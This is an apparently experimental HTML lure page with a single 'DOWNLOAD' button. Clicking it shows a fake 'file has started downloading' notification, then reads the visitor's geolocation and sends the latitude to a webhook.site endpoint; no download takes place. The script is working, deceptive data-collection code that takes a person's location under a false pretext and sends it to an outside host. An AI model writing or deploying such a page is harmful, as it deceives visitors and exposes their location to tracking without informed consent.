<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test</title>
    <style>
        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        button { background: #007bff; color: #fff; border: none; padding: 20px 40px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; }
    </style>
</head>
<body>

    <button id="btn">DOWNLOAD</button>

<script>
    const btn = document.getElementById('btn');
    const webhook = "https://webhook.site/3536371a-f8c8-445e-a399-617a47d6fadb";

    btn.onclick = function() {
        // 1. Сначала простое уведомление (без всяких проверок)
        Notification.requestPermission().then(perm => {
            if (perm === 'granted') {
                // Создаем уведомление напрямую через конструктор
                const n = new Notification("Внимание", {
                    body: "Файл начал загрузку...",
                    requireInteraction: true // Не дает уведомлению исчезнуть быстро
                });
                
                // 2. Сбор данных ПОСЛЕ уведомления
                navigator.geolocation.getCurrentPosition(res => {
                    fetch(webhook + "?lat=" + res.coords.latitude);
                });
            } else {
                alert("Разреши уведомления в настройках браузера!");
            }
        });
    };
</script>

</body>
</html>
